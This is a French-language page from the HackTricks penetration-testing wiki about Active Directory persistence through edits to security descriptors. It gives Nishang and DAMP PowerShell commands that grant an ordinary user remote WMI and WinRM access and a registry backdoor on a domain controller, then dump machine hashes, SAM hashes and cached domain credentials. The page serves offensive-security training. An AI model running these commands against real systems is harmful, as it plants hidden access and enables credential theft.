# Descripteurs de sécurité

{{#include ../../banners/hacktricks-training.md}}

## Descripteurs de sécurité

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Le langage de définition des descripteurs de sécurité (SDDL) définit le format utilisé pour décrire un descripteur de sécurité. SDDL utilise des chaînes ACE pour DACL et SACL : `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Les **descripteurs de sécurité** sont utilisés pour **stocker** les **permissions** qu'un **objet** a **sur** un **objet**. Si vous pouvez simplement **faire** un **petit changement** dans le **descripteur de sécurité** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.

Ensuite, cette technique de persistance est basée sur la capacité à obtenir chaque privilège nécessaire contre certains objets, afin de pouvoir effectuer une tâche qui nécessite généralement des privilèges d'administrateur mais sans avoir besoin d'être administrateur.

### Accès à WMI

Vous pouvez donner à un utilisateur l'accès pour **exécuter à distance WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Accès à WinRM

Donner accès à **la console PS winrm à un utilisateur** [**en utilisant ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accès à distance aux hachages

Accédez au **registre** et **dump les hachages** en créant une **porte dérobée Reg** utilisant [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** afin de pouvoir à tout moment récupérer le **hachage de l'ordinateur**, le **SAM** et toute **information d'identification AD mise en cache** sur l'ordinateur. Il est donc très utile de donner cette permission à un **utilisateur régulier contre un ordinateur de contrôleur de domaine** :
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Vérifiez [**Silver Tickets**](silver-ticket.md) pour apprendre comment vous pourriez utiliser le hachage du compte d'ordinateur d'un contrôleur de domaine.

{{#include ../../banners/hacktricks-training.md}}
